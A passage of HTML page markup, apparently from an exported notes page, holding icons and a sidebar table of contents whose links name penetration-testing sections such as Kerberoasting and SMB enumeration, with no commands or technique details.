stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><line x1="7" x2="17" y1="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div><canvas height="512px" id="graph-canvas" width="512px"></canvas></div></div></div><div class="tree-container outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button"><svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"></svg></button></div><div class="tree-scroll-area"><div class="tree-item" data-depth="1"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="#35-Ghost"><span class="tree-item-title"><p>35-Ghost</p></span></a></div><div class="tree-item-children"><div class="tree-item" data-depth="4"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="#Start_of_proxy"><span class="tree-item-title"><p>Start of proxy</p></span></a></div><div class="tree-item-children"></div></div><div class="tree-item" data-depth="3"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="#Kerberoasting."><span class="tree-item-title"><p>Kerberoasting.</p></span></a></div><div class="tree-item-children"></div></div><div class="tree-item" data-depth="5"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="#SMB_Enumeration."><span class="tree-item-title"><p>SMB Enumeration.</p></span></a></div><div class="tree-item-children"></div></div><div class="tree-item" data-depth="4"><div class="tree-item-contents"><a class="internal-link tree-item-link" href="#SMB_Enumeration_from_Administrators_account"><span class="tree-item-title"><p>SMB Enumeration from Administrators account</p></span></a></div><div class="tree-item-children"></div></div></div></div></div></div></div></div></div></div></div></div></body></html>
